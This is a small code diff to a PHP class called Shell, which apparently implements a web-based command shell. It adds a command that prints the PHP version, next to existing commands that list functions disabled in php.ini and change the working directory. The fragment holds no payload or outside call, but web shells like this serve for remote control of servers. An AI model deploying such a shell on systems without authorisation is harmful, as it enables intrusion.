@@ -85,6 +85,8 @@ class Shell{
 			}elseif( preg_match('/^get_disabled_functions$/', $command) ){
 				$disabled_functions = $this->disabled_functions();
 				echo "These functions are disabled throught php.ini: ".implode(','.chr(32), $disabled_functions);
+			}elseif( preg_match('/^(get_php_version|php_version)$/', $command) ){
+				echo "PHP Version is: ".PHP_VERSION;
 			}elseif( preg_match('/^cd (.*)/', $command, $match) ){
 				$_SESSION['cwd'] = realpath($match[1]);
 				echo "Changed directory to: {$_SESSION['cwd']}";
